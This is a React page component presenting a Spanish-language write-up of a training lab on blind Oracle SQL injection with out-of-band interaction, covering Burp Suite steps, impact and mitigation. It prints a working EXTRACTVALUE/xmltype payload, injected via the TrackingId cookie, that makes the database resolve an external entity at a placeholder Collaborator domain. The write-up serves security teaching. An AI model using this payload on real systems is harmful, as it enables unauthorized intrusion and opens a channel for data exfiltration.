import React from 'react';
import { SQLI_LABS } from '@/app/data/sqliLabs';

const Lab16 = () => {
  const lab = SQLI_LABS.find((l) => l.id === 'lab-16');
  if (!lab) return <div>Laboratorio no encontrado</div>;

  return (
    <section className="pt-28 pb-16 bg-black/95 min-h-screen">
      <div className="max-w-5xl mx-auto px-4 sm:px-6 lg:px-8">
        <h1 className="text-2xl sm:text-3xl font-mono text-[#d4a574] mb-6">
          {lab.title}
        </h1>

        {/* Datos generales */}
        <div className="mb-8 bg-[#1a1a1a]/40 border border-[#d4a574]/20 p-5">
          <h3 className="text-lg font-bold text-[#cc6633] mb-3">Datos generales del laboratorio</h3>
          <ul className="space-y-2 text-sm font-mono text-[#d4a574]/80">
            <li><span className="text-[#cc6633]">Nombre:</span> Blind SQL injection with out-of-band interaction</li>
            <li><span className="text-[#cc6633]">Subtema:</span> Exploiting blind SQL injection using out-of-band (OAST) techniques</li>
            <li><span className="text-[#cc6633]">Nivel:</span> Practitioner</li>
            <li><span className="text-[#cc6633]">Tipo de SQLi:</span> Blind SQL injection (Out-of-band / OAST)</li>
            <li><span className="text-[#cc6633]">Objetivo:</span> Explotar la vulnerabilidad en la cookie TrackingId para forzar al servidor a realizar una consulta DNS/HTTP hacia Burp Collaborator y confirmar la inyección mediante una interacción externa.</li>
          </ul>
        </div>

        {/* Explicación técnica */}
        <h3 className="text-lg font-bold text-[#cc6633]">Explicación técnica de la vulnerabilidad</h3>
        <div className="intro text-[#d4a574] mb-6">
          La aplicación presenta una vulnerabilidad de <span className="text-[#cc6633]">Blind SQL Injection</span>
          en la cookie <span className="text-[#cc6633]">TrackingId</span> que no produce cambios visibles en la
          respuesta HTTP. Debido a que el backend utiliza una base de datos Oracle, es posible abusar de
          funciones específicas de procesamiento XML que generan interacciones de red.
          <br /><br />
          Mediante esta vulnerabilidad se inyecta un comando que obliga al motor de la base de datos a
          resolver una entidad externa, provocando así una consulta DNS o HTTP hacia un dominio controlado
          por el atacante, en este caso un subdominio único de <span className="text-[#cc6633]">Burp Collaborator</span>.
          <br /><br />
          Aunque la respuesta al navegador siga siendo normal, la evidencia de la explotación aparece fuera
          de banda al registrar dicha interacción en el Collaborator Client.
        </div>

        {/* Procedimiento */}
        <div className="space-y-6">
          <h3 className="text-lg font-bold text-[#cc6633]">Procedimiento paso a paso</h3>
          {[
            {
              title: 'Paso 1: Captura del tráfico',
              items: [
                'Abrir el laboratorio y registrar la petición principal en el HTTP History de Burp Suite.',
                'Identificar la cookie TrackingId como el punto de entrada vulnerable.',
              ],
            },
            {
              title: 'Paso 2: Preparación en Repeater',
              items: [
                'Enviar la petición a Repeater.',
                'Localizar la cookie TrackingId y dejarla lista para insertar el payload.',
              ],
            },
            {
              title: 'Paso 3: Configuración del Burp Collaborator',
              items: [
                'Abrir Burp Collaborator Client.',
                'Hacer clic en "Copy to clipboard" para obtener un dominio único controlado.',
              ],
            },
            {
              title: 'Paso 4: Inyección del payload',
              items: [
                'Insertar en la cookie TrackingId un payload que use funciones XML de Oracle.',
                'Configurar el payload para apuntar al subdominio generado por Burp Collaborator.',
              ],
            },
            {
              title: 'Paso 5: Ejecución del ataque',
              items: [
                'Enviar la petición modificada desde Repeater.',
                'Observar que la respuesta HTTP puede seguir siendo 200 OK sin cambios visibles.',
              ],
            },
            {
              title: 'Paso 6: Verificación fuera de banda',
              items: [
                'Regresar al Burp Collaborator Client.',
                'Hacer clic en "Poll now" para consultar interacciones registradas.',
                'Confirmar la resolución del laboratorio al observar interacciones DNS y/o HTTP provenientes del servidor de base de datos.',
              ],
            },
          ].map((phase, idx) => (
            <div key={idx}>
              <h4 className="text-md font-bold text-[#d4a574]">{phase.title}</h4>
              <ul className="space-y-2 pl-6 list-decimal">
                {phase.items.map((item, itemIdx) => (
                  <li key={itemIdx} className="text-sm font-mono text-[#d4a574]/75">
                    {item}
                  </li>
                ))}
              </ul>
            </div>
          ))}
        </div>

        {/* Payload */}
        <div className="mb-6 mt-8">
          <h3 className="text-lg font-bold text-[#cc6633]">Payload utilizado</h3>
          <pre className="bg-[#1a1a1a]/40 border border-[#d4a574]/20 p-4 text-[#d4a574] font-mono overflow-x-auto whitespace-pre-wrap">
{`' UNION SELECT EXTRACTVALUE(
  xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://TU-SUBDOMINIO-COLLABORATOR/"> %remote;]>'),
  '/l'
) FROM dual--`}
          </pre>
          <p className="text-sm font-mono text-[#d4a574]/65 mt-3">
            Sustituye <span className="text-[#cc6633]">TU-SUBDOMINIO-COLLABORATOR</span> por el dominio único generado por Burp Collaborator.
          </p>
        </div>

        {/* Explicación del payload */}
        <div className="mb-6">
          <h3 className="text-lg font-bold text-[#cc6633]">Explicación del payload</h3>
          <div className="intro text-[#d4a574] mb-6">
            El payload utiliza funciones XML de Oracle para forzar una conexión saliente:
            <br /><br />
            <span className="text-[#cc6633]">
              ' UNION SELECT EXTRACTVALUE(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://TU-SUBDOMINIO-COLLABORATOR/"&gt; %remote;]&gt;'),'/l') FROM dual--
            </span>
            <br /><br />
            <span className="text-[#cc6633]">EXTRACTVALUE / xmltype</span>: funciones de Oracle que procesan XML.
            En este contexto se abusan para obligar a la base de datos a resolver una entidad externa.
            <br /><br />
            <span className="text-[#cc6633]">DOCTYPE root / ENTITY</span>: define una entidad externa de sistema
            que apunta a la URL de Burp Collaborator.
            <br /><br />
            <span className="text-[#cc6633]">SYSTEM "http://..."</span>: ordena al motor que intente obtener
            el contenido de la entidad desde el dominio indicado, disparando una interacción DNS/HTTP.
            <br /><br />
            <span className="text-[#cc6633]">FROM dual</span>: completa la sintaxis de la consulta en Oracle.
            <br /><br />
            Esta técnica demuestra una explotación <span className="text-[#cc6633]">out-of-band</span>, ya que
            la confirmación no aparece en la respuesta de la aplicación, sino en la interacción registrada
            externamente por Burp Collaborator.
          </div>
        </div>

        {/* Impacto */}
        <div className="mb-6">
          <h3 className="text-lg font-bold text-[#cc6633]">Impacto en seguridad</h3>
          <ul className="space-y-2 pl-6 list-disc text-sm font-mono text-[#d4a574]/75">
            <li><span className="text-[#cc6633]">Confidencialidad:</span> confirma que la base de datos puede ser inducida a comunicarse con infraestructura externa controlada por un atacante.</li>
            <li><span className="text-[#cc6633]">Integridad:</span> evidencia que la consulta SQL original puede ser manipulada para ejecutar funciones no previstas por la aplicación.</li>
            <li><span className="text-[#cc6633]">Disponibilidad:</span> funciones externas y resoluciones repetidas pueden degradar el rendimiento y abrir la puerta a exfiltración o pivoting posterior.</li>
          </ul>
        </div>

        {/* Mitigación */}
        <div className="mb-6">
          <h3 className="text-lg font-bold text-[#cc6633]">Mitigación recomendada</h3>
          <div className="intro text-[#d4a574] mb-6">
            Para prevenir esta vulnerabilidad, la medida principal es el uso de consultas preparadas
            que parametricen correctamente las cookies y eviten que la entrada del usuario sea evaluada
            como código SQL.
            <br /><br />
            Además, se deben implementar restricciones de red que impidan al servidor de base de datos
            realizar peticiones hacia dominios externos no autorizados. Como defensa adicional, conviene
            deshabilitar funciones de red innecesarias en la base de datos, especialmente aquellas
            relacionadas con procesamiento XML y resolución de URIs externas.
          </div>
        </div>

        {/* Evidencias */}
        <div className="mb-6">
          <h3 className="text-lg font-bold text-[#cc6633]">Evidencias</h3>
          <p className="text-sm font-mono text-[#d4a574]/65 mb-4">
            Coloca aquí las capturas correspondientes al request interceptado, payload utilizado,
            respuesta de la aplicación y confirmación del laboratorio mediante Burp Collaborator.
          </p>

          <div className="mb-6">
            <p className="text-sm font-mono text-[#d4a574]/65 mb-2">
              Figura 1. Request interceptado con la cookie TrackingId.
            </p>
            <img
              src={`${import.meta.env.BASE_URL}images/sqli/lab16-request.png`}
              alt="Lab 16 request interceptado"
              className="w-full max-w-4xl border border-[#d4a574]/20"
            />
          </div>

          <div className="mb-6">
            <p className="text-sm font-mono text-[#d4a574]/65 mb-2">
              Figura 2. Payload insertado con dominio de Burp Collaborator.
            </p>
            <img
              src={`${import.meta.env.BASE_URL}images/sqli/lab16-payload.png`}
              alt="Lab 16 payload"
              className="w-full max-w-4xl border border-[#d4a574]/20"
            />
          </div>

          <div className="mb-6">
            <p className="text-sm font-mono text-[#d4a574]/65 mb-2">
              Figura 3. Respuesta vulnerable / respuesta normal de la aplicación.
            </p>
            <img
              src={`${import.meta.env.BASE_URL}images/sqli/lab16-response.png`}
              alt="Lab 16 respuesta"
              className="w-full max-w-4xl border border-[#d4a574]/20"
            />
          </div>

          <div>
            <p className="text-sm font-mono text-[#d4a574]/65 mb-2">
              Figura 4. Confirmación de “Lab Solved” y/o interacciones registradas en Burp Collaborator.
            </p>
            <img
              src={`${import.meta.env.BASE_URL}images/sqli/lab16-solved.png`}
              alt="Lab 16 laboratorio resuelto"
              className="w-full max-w-4xl border border-[#d4a574]/20"
            />
          </div>
        </div>

        {/* Referencias */}
        <div className="references">
          <h3 className="text-lg font-bold text-[#cc6633]">Referencias</h3>
          <ul className="space-y-2">
            {lab.references.map((r, idx) => (
              <li key={idx} className="text-sm font-mono text-[#d4a574]/75">
                <span className="text-[#cc6633]">› </span>
                <span className="text-[#d4a574]">{r.label}:</span> {r.value}
              </li>
            ))}
          </ul>
        </div>
      </div>
    </section>
  );
};

export default Lab16;